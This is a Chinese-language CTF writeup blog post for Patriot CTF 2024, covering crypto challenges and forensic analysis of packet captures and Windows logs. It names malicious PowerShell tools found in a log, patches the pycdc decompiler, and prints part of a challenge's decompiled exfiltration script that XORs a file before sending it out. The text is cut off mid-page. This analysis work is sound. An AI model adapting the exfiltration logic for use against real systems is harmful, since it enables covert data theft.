<!doctype html>
<html lang="zh-Hans" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-ctf-writeup-blog" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.6.3">
<title data-rh="true">Patriot CTF 2024 Writeup | Ribom&#x27;s blogs</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://RibomBalt.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://RibomBalt.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://RibomBalt.github.io/ctf-writeup/2024/09/23/patriotCTF"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="Patriot CTF 2024 Writeup | Ribom&#x27;s blogs"><meta data-rh="true" name="description" content="Lysithea 5176 67th 2024.09.22-23"><meta data-rh="true" property="og:description" content="Lysithea 5176 67th 2024.09.22-23"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2024-09-23T00:00:00.000Z"><meta data-rh="true" property="article:tag" content="CTF"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://RibomBalt.github.io/ctf-writeup/2024/09/23/patriotCTF"><link data-rh="true" rel="alternate" href="https://RibomBalt.github.io/ctf-writeup/2024/09/23/patriotCTF" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://RibomBalt.github.io/ctf-writeup/2024/09/23/patriotCTF" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://RibomBalt.github.io/ctf-writeup/2024/09/23/patriotCTF","mainEntityOfPage":"https://RibomBalt.github.io/ctf-writeup/2024/09/23/patriotCTF","url":"https://RibomBalt.github.io/ctf-writeup/2024/09/23/patriotCTF","headline":"Patriot CTF 2024 Writeup","name":"Patriot CTF 2024 Writeup","description":"Lysithea 5176 67th 2024.09.22-23","datePublished":"2024-09-23T00:00:00.000Z","author":{"@type":"Person","name":"Lysithea","description":"CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt","email":"ribombalt1@gmail.com","image":"https://github.com/RibomBalt.png"},"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://RibomBalt.github.io/ctf-writeup","name":"Blog"}}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Ribom&#39;s blogs RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Ribom&#39;s blogs Atom Feed">



<link rel="alternate" type="application/rss+xml" href="/ctf-writeup/rss.xml" title="Ribom&#39;s blogs RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/ctf-writeup/atom.xml" title="Ribom&#39;s blogs Atom Feed"><link rel="stylesheet" href="/assets/css/styles.94616287.css">
<script src="/assets/js/runtime~main.718a7f9e.js" defer="defer"></script>
<script src="/assets/js/main.c98e7758.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Ribom&#x27;s blogs</b></a><a class="navbar__item navbar__link" href="/blog">Blog</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/ctf-writeup">CTF Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/RibomBalt" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="最近博文导航"><div class="sidebarItemTitle_pO2u margin-bottom--md">All blogs</div><div role="group"><h3 class="yearGroupHeading_rMGB">9999</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/9999/12/26/summary-ctf">关于CTF Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2025/01/05/irisctf2025">Iris CTF 2025</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2024</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/11/17/geekgame2024-iot">GeekGame 2024 IoT Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/11/10/hackergame2024-writeup">Hackergame 2024 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/10/11/geekgame4-writeup">GeekGame4 Writeup</a></li><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="/ctf-writeup/2024/09/23/patriotCTF">Patriot CTF 2024 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/06/24/GoogleCTF2024">Google CTF 2024 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/05/29/angstormCTF2024">TJCTF 2024 / NahamConCTF 2024 / ångstrom CTF 2024</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/05/13/TBTLCTF2024">squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/04/14/geekctf-writeup">GeekCTF 2024 (+2 small CTFs)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/04/02/UTCTF2024">UTCTF 2024 个人题解</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2024/02/07/hpcgame2024">HPCGame1 Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2023</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/12/21/0CTF2023">0CTF 2023 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/12/05/NBCTF2023">TUCTF &amp; Newport Blakes CTF Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/11/28/TPCTF2023">TPCTF 2023 (清北CTF) Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/11/04/HG2023">Hackergame2023 Writeup</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2023/10/21/GG3">GeekGame3 Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2022</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2022/11/27/GeekGame2">GeekGame2 CTF Writeup</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2021</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/ctf-writeup/2021/11/21/GeekGame1">GeekGame1 Writeup</a></li></ul></div></nav></aside><main class="col col--7"><article><header><h1 class="title_f1Hy">Patriot CTF 2024 Writeup</h1><div class="container_mt6G margin-vert--md"><time datetime="2024-09-23T00:00:00.000Z">2024年9月23日</time> · <!-- -->阅读需 17 分钟</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a class="avatar__photo-link" href="/ctf-writeup/authors/RibomBalt"><img class="avatar__photo authorImage_XqGP" src="https://github.com/RibomBalt.png" alt="Lysithea"></a><div class="avatar__intro authorDetails_lV9A"><div class="avatar__name"><a href="/ctf-writeup/authors/RibomBalt"><span class="authorName_yefp">Lysithea</span></a></div><small class="authorTitle_nd0D" title="CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt">CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt</small><div class="authorSocials_rSDt"><a href="https://github.com/RibomBalt" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="GitHub"><svg viewBox="0 0 256 250" width="1em" height="1em" class="authorSocialLink_owbf githubSvg_Uu4N" xmlns="http://www.w3.org/2000/svg" style="--dark:#000;--light:#fff" preserveAspectRatio="xMidYMid"><path d="M128.001 0C57.317 0 0 57.307 0 128.001c0 56.554 36.676 104.535 87.535 121.46 6.397 1.185 8.746-2.777 8.746-6.158 0-3.052-.12-13.135-.174-23.83-35.61 7.742-43.124-15.103-43.124-15.103-5.823-14.795-14.213-18.73-14.213-18.73-11.613-7.944.876-7.78.876-7.78 12.853.902 19.621 13.19 19.621 13.19 11.417 19.568 29.945 13.911 37.249 10.64 1.149-8.272 4.466-13.92 8.127-17.116-28.431-3.236-58.318-14.212-58.318-63.258 0-13.975 5-25.394 13.188-34.358-1.329-3.224-5.71-16.242 1.24-33.874 0 0 10.749-3.44 35.21 13.121 10.21-2.836 21.16-4.258 32.038-4.307 10.878.049 21.837 1.47 32.066 4.307 24.431-16.56 35.165-13.12 35.165-13.12 6.967 17.63 2.584 30.65 1.255 33.873 8.207 8.964 13.173 20.383 13.173 34.358 0 49.163-29.944 59.988-58.447 63.157 4.591 3.972 8.682 11.762 8.682 23.704 0 17.126-.148 30.91-.148 35.126 0 3.407 2.304 7.398 8.792 6.14C219.37 232.5 256 184.537 256 128.002 256 57.307 198.691 0 128.001 0Zm-80.06 182.34c-.282.636-1.283.827-2.194.39-.929-.417-1.45-1.284-1.15-1.922.276-.655 1.279-.838 2.205-.399.93.418 1.46 1.293 1.139 1.931Zm6.296 5.618c-.61.566-1.804.303-2.614-.591-.837-.892-.994-2.086-.375-2.66.63-.566 1.787-.301 2.626.591.838.903 1 2.088.363 2.66Zm4.32 7.188c-.785.545-2.067.034-2.86-1.104-.784-1.138-.784-2.503.017-3.05.795-.547 2.058-.055 2.861 1.075.782 1.157.782 2.522-.019 3.08Zm7.304 8.325c-.701.774-2.196.566-3.29-.49-1.119-1.032-1.43-2.496-.726-3.27.71-.776 2.213-.558 3.315.49 1.11 1.03 1.45 2.505.701 3.27Zm9.442 2.81c-.31 1.003-1.75 1.459-3.199 1.033-1.448-.439-2.395-1.613-2.103-2.626.301-1.01 1.747-1.484 3.207-1.028 1.446.436 2.396 1.602 2.095 2.622Zm10.744 1.193c.036 1.055-1.193 1.93-2.715 1.95-1.53.034-2.769-.82-2.786-1.86 0-1.065 1.202-1.932 2.733-1.958 1.522-.03 2.768.818 2.768 1.868Zm10.555-.405c.182 1.03-.875 2.088-2.387 2.37-1.485.271-2.861-.365-3.05-1.386-.184-1.056.893-2.114 2.376-2.387 1.514-.263 2.868.356 3.061 1.403Z"></path></svg></a><a href="https://stackoverflow.com/users/RibomBalt" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="Stack Overflow"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 169.61 200" width="1em" height="1em" class="authorSocialLink_owbf"><path d="M140.44 178.38v-48.65h21.61V200H0v-70.27h21.61v48.65z" fill="#bcbbbb"></path><path d="M124.24 140.54l4.32-16.22-86.97-17.83-3.78 17.83zM49.7 82.16L130.72 120l7.56-16.22-81.02-37.83zm22.68-40l68.06 57.3 11.35-13.51-68.6-57.3-11.35 13.51zM116.14 0l-14.59 10.81 53.48 71.89 14.58-10.81zM37.81 162.16h86.43v-16.21H37.81z" fill="#f48024"></path></svg></a><a href="https://ctftime.org/team/282941" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="ctftimes"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="authorSocialLink_owbf"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M3 12a9 9 0 1 0 18 0a9 9 0 0 0 -18 0"></path><path d="M3.6 9h16.8"></path><path d="M3.6 15h16.8"></path><path d="M11.5 3a17 17 0 0 0 0 18"></path><path d="M12.5 3a17 17 0 0 1 0 18"></path></svg></a></div></div></div></div></div></header><div id="__blog-post-container" class="markdown"><p>Lysithea 5176 67th 2024.09.22-23</p>
<p>George Mason University 主办的周末CTF比赛，题量很大，难度分了五个级别（beginner, easy, medium, hard, expert），归类于入门/简单题的占40%（虽然即使是简单题也不一定真的简单），也有两三道压轴难题（Web压轴是一个Apache/PHP，Pwn有一个V8题和一个内核题，Crypto也有一个没看是什么）。高手应该不少，第一日就看到有人专杀难题。比赛专业程度中等，确实比一些高中赛专业，题目基本都共用环境（但没遇到隔离问题），中间下线调整过几次，但不太影响比赛体验。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="crypto">Crypto<a href="#crypto" class="hash-link" aria-label="Crypto的直接链接" title="Crypto的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="idk-cipher--bg">idk cipher / bg<a href="#idk-cipher--bg" class="hash-link" aria-label="idk cipher / bg的直接链接" title="idk cipher / bg的直接链接">​</a></h3>
<p>简单的换位异或加密。附件里的key就是实际加密用的key。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bigger-is-better--bg">bigger is better / bg<a href="#bigger-is-better--bg" class="hash-link" aria-label="bigger is better / bg的直接链接" title="bigger is better / bg的直接链接">​</a></h3>
<p>e很大（和N同量级）下的RSA解密。找了个<a href="https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd" target="_blank" rel="noopener noreferrer">Weiner Attack</a>的code秒了</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bit-by-bit--ez">bit by bit / ez<a href="#bit-by-bit--ez" class="hash-link" aria-label="bit by bit / ez的直接链接" title="bit by bit / ez的直接链接">​</a></h3>
<p>循环密钥异或加密，key部分位未知，但明文是有意义的英文，代码写法不太常规。按加密块长度（16字节）分组打印后，根据英文单词特征可以逐个字节还原。原文是一篇讲ENIAC的密码学文章。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="forensic">Forensic<a href="#forensic" class="hash-link" aria-label="Forensic的直接链接" title="Forensic的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="simple-exfiltration--ez">simple exfiltration / ez<a href="#simple-exfiltration--ez" class="hash-link" aria-label="simple exfiltration / ez的直接链接" title="simple exfiltration / ez的直接链接">​</a></h3>
<p>给了一个流量包。TCP/HTTP都是正常流量，但容易发现对同一个对象的ICMP的TTL似乎各不相同，而且看起来是ascii值，提取出来就是flag。</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tshark -r ./simple.pcapng -T fields -e &quot;ip.ttl&quot; -Y &quot;icmp&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bad-blood--ez--failed">bad blood / ez / failed<a href="#bad-blood--ez--failed" class="hash-link" aria-label="bad blood / ez / failed的直接链接" title="bad blood / ez / failed的直接链接">​</a></h3>
<p>给了一个Windows日志文件（EVTX）。直接打开后发现大量远程Powershell命令执行的条目。用<code>python-evtx</code>这个包提取日志并转换为XML，可以把实际被执行的命令拼接出来。</p>
<p>首先下载了两个恶意脚本<code>Invoke-UrbanBishop</code>和<code>Invoke-P0wnedshell</code>，之后似乎是用长串的base64 + deflate了实际执行的命令。只是Powershell我确实不熟悉，Windows Defender已知报毒，再加上我确实不太敢在真机上搞这种危险脚本，就没做完。逆向那些代码应该不会太难。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="slingshot--nm">slingshot / nm<a href="#slingshot--nm" class="hash-link" aria-label="slingshot / nm的直接链接" title="slingshot / nm的直接链接">​</a></h3>
<blockquote>
<p>这个题涉及Python 3.11 pyc逆向，最好和<code>rev-password protecter</code>一起看，都用到了<code>pycdc</code>工具</p>
</blockquote>
<p>这个题也是给了流量包。<code>10.151.198.69</code>和<code>93.132.55.192</code>之间有一个<code>GET /download.pyc</code>的HTTP通信，并且之后有三次TCP通信。</p>
<p>逆向完成后，可以猜出代码读取文件后，和当前时间epoch做了一个循环异或，再发送给对方。我们根据流量包的流量记录和时间戳，可以得到数据，三次TCP通信连起来是一个jpg文件的前半部分，但是足够看到flag了。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="pycdc-2024923-版本-311-before_with-opcode处理">pycdc 2024.9.23 版本 3.11 BEFORE_WITH opcode处理<a href="#pycdc-2024923-版本-311-before_with-opcode处理" class="hash-link" aria-label="pycdc 2024.9.23 版本 3.11 BEFORE_WITH opcode处理的直接链接" title="pycdc 2024.9.23 版本 3.11 BEFORE_WITH opcode处理的直接链接">​</a></h4>
<p>不出意外pycdc导出会报错：<code>Unsupported opcode: BEFORE_WITH</code>，这是因为目前pycdc还不支持3.11版本，而<code>BEFORE_WITH</code>是3.11新加的opcode。用pycdas导出伪汇编进一步分析。</p>
<p>可以看出报错的地方就是一个with打开文件的语句。理论上说被with影响的范围应该很短，但是反编译器在这里直接停了。能不能想办法跨过去继续反编译呢？</p>
<p>在<code>pycdc</code>项目的<code>ASTree.cpp</code>可以看到处理opcode的分支。我们其实只要加上<code>BEFORE_WITH</code>的分支就可以让它不走<code>default</code>分支报错。当然我们直接这么加分支大概率是会让结果出错的，但是我们只要保证结果大致是堆栈平衡的，只要出了with区域结果仍然比较可靠。为了增强可信度，我们还可以用3.10版本<code>python -m compileall</code>导出旧版本pyc对比分析，就可以知道应该把新指令当成哪个旧指令等价替代了。</p>
<p>在添加了包括<code>BEFORE_WITH</code>在内的一些opcode后：</p>
<div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">diff --git a/ASTree.cpp b/ASTree.cpp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">index 050eebf..6d68258 100644</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--- a/ASTree.cpp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+++ b/ASTree.cpp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@@ -1876,12 +1876,19 @@ PycRef&lt;ASTNode&gt; BuildFromCode(PycRef&lt;PycCode&gt; code, PycModule* mod)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         case Pyc::SETUP_WITH_A:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         case Pyc::WITH_EXCEPT_START:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+        case Pyc::BEFORE_WITH:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+        case Pyc::PUSH_EXC_INFO:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 PycRef&lt;ASTBlock&gt; withblock = new ASTWithBlock(pos+operand);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 blocks.push(withblock);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 curblock = blocks.top();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+        case Pyc::RERAISE_A:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+            break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+        case Pyc::COPY_A:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+            break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         case Pyc::WITH_CLEANUP:</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以成功跑过去，反编译出来的代码大致是这样的：</p>
<div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">port </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">22993</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">file</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;rb&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data_bytes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">(</span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">current_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 